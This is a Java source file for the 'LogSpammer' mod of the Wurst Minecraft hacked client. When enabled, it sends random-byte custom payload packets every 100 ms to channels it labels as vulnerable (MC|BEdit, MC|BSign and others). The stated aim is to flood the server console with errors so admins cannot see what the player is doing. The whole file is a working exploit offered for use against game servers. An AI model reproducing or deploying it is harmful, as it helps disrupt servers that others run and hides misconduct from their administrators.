/*
 * Copyright © 2014 - 2018 | Wurst-Imperium | All rights reserved.
 *
 * This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at http://mozilla.org/MPL/2.0/.
 */
package net.wurstclient.features.mods.other;

import java.util.Random;

import io.netty.buffer.Unpooled;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.CPacketCustomPayload;
import net.wurstclient.compatibility.WConnection;
import net.wurstclient.events.UpdateListener;
import net.wurstclient.features.Category;
import net.wurstclient.features.Mod;

@Mod.Bypasses(ghostMode = false, latestNCP = false, olderNCP = false)
public final class LogSpammerMod extends Mod implements UpdateListener
{
	private PacketBuffer payload;
	private Random random;
	private final String[] vulnerableChannels =
		new String[]{"MC|BEdit", "MC|BSign", "MC|TrSel", "MC|PickItem"};
	
	public LogSpammerMod()
	{
		super("LogSpammer",
			"Fills the server console with errors so that admins can't see what you are doing.\n"
				+ "Patched on Bukkit and Spigot servers. They will kick you if you use it.");
		setCategory(Category.OTHER);
	}
	
	@Override
	public void onEnable()
	{
		random = new Random();
		payload = new PacketBuffer(Unpooled.buffer());
		
		byte[] rawPayload = new byte[random.nextInt(128)];
		random.nextBytes(rawPayload);
		payload.writeBytes(rawPayload);
		
		wurst.events.add(UpdateListener.class, this);
	}
	
	@Override
	public void onDisable()
	{
		wurst.events.remove(UpdateListener.class, this);
	}
	
	@Override
	public void onUpdate()
	{
		updateMS();
		if(hasTimePassedM(100))
		{
			WConnection.sendPacket(new CPacketCustomPayload(
				vulnerableChannels[random.nextInt(vulnerableChannels.length)],
				payload));
			updateLastMS();
		}
	}
}
